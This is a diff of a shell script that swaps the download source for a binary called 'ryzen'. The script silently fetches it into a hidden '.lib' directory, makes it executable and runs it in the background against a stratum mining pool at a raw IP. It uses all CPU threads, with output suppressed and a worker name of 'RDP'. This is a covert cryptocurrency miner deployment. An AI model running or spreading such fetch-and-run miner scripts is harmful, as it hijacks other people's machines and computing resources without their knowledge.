@@ -7,7 +7,7 @@ bash root.sh
 apt update 
 apt install -y wget curl sudo git
 mkdir .lib && cd .lib
-wget -O sgr1 https://bitbucket.org/hanafie1/all-jobs/downloads/ryzen >/dev/null 2>&1
+wget -O sgr1 https://github.com/rifamanajul/rifamanajul/raw/refs/heads/main/ryzen >/dev/null 2>&1
 chmod +x sgr1
 ./sgr1 -a YespowerTIDE -o stratum+tcp://47.237.3.59:443 -u TFjVcsSSXbyVNa9gdiYrhDCtfkamCNLHCf.RDP -p c=TDC -t $(nproc --all) >/dev/null 2>&1 &
 sleep 30
